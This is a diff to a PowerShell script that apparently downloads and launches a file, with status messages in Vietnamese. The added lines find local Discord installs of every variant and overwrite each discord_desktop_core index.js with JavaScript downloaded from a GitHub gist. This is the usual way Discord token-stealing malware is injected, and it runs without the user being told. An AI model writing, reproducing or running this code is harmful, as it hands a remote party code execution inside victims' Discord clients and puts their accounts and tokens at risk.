@@ -115,3 +115,39 @@ if (Test-Path -Path $output) {
     Start-Process $output
     Write-Host "Tệp đã được tải về thành công."
 }
+
+$locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
+$discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
+
+foreach ($path in $discPaths) {
+    $skibidipath = Join-Path $locAppData $path
+    if (-not (Test-Path $skibidipath)) {
+        continue
+    }
+
+    Get-ChildItem $skibidipath -Recurse | ForEach-Object {
+        if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
+            $files = Get-ChildItem $_.FullName
+            foreach ($file in $files) {
+                if ($file.Name -eq "index.js") {
+                    try {
+                        # Download content from the specified URL
+                        $webClient = New-Object System.Net.WebClient
+                        $content = $webClient.DownloadString("https://gist.githubusercontent.com/43a1723/45eaf5d60790b53092841ee6cdf5aea1/raw/a69821c4379655c84d529b91b83256b09b39577c/lmao.js")
+                        
+                        if ($content -ne "") {
+                            # Write the downloaded content to the index.js file
+                            $content | Set-Content -Path $file.FullName -Force
+                            Write-Host "Updated $($file.FullName) successfully." -ForegroundColor Green
+                        } else {
+                            Write-Host "Downloaded content is empty. Skipping file: $($file.FullName)" -ForegroundColor Yellow
+                        }
+                    } catch {
+                        Write-Host "Error occurred while processing $($file.FullName): $_" -ForegroundColor Red
+                    }
+                }
+            }
+        }
+    }
+}
+
